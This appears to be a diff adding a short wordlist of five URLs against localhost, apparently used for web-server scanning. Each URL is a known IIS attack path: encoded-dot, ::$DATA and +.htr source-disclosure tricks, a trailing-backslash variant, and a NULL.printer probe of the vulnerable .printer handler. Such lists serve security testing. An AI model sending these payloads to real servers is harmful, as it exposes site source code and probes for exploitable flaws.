@@ -1,0 +1,5 @@
+http://127.0.0.1/default%2easp
+http://127.0.0.1/default.asp::$DATA
+http://127.0.0.1/default.asp\
+http://127.0.0.1/default.asp+.htr
+http://127.0.0.1/NULL.printer
